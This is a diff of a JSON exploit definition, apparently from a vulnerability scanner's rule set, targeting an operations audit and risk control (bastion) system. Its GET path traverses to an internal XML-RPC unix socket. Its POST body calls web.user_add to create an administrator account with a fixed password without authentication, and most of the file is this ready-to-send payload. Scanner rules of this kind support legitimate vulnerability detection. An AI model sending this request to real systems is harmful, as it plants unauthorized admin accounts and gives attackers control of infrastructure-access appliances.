@@ -3,7 +3,7 @@
   "name":"明御运维审计与风险控制系统任意用户添加",
   "tag":"anheng",
   "type":"unauthorized",
-  "detail": {
+  "poc": {
     "pocGet": "/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc",
     "pocPost": "<?xml version=\"1.0\"?>  \n<methodCall>\n<methodName>web.user_add</methodName>\n<params>\n<param>\n<value>\n<array>\n<data>\n<value>\n<string>admin</string>\n</value>\n<value>\n<string>5</string>\n</value>\n<value>\n<string>10.10.10.10</string>\n</value>\n</data>\n</array>\n</value>\n</param>\n<param>\n<value>\n<struct>\n<member>\n<name>uname</name>\n<value>\n<string>admin</string>\n</value>\n</member>\n<member>\n<name>name</name>\n<value>\n<string>test</string>\n</value>\n</member>\n<member>\n<name>pwd</name>\n<value>\n<string>ABC123!@#</string>\n</value>\n</member>\n<member>\n<name>authmode</name>\n<value>\n<string>1</string>\n</value>\n</member>\n<member>\n<name>deptid</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>email</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>mobile</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>comment</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>roleid</name>\n<value>\n<string>102</string>\n</value>\n</member>\n</struct></value>\n</param>\n</params>\n</methodCall>",
     "header": {
@@ -11,6 +11,6 @@
       "content-type": "application/x-www-form-urlencoded",
       "User-Agent": "Mozilla/5.0 (Linux;"
     },
-    "pattern": "msg"
+    "Pattern": "(msg)"
   }
 }
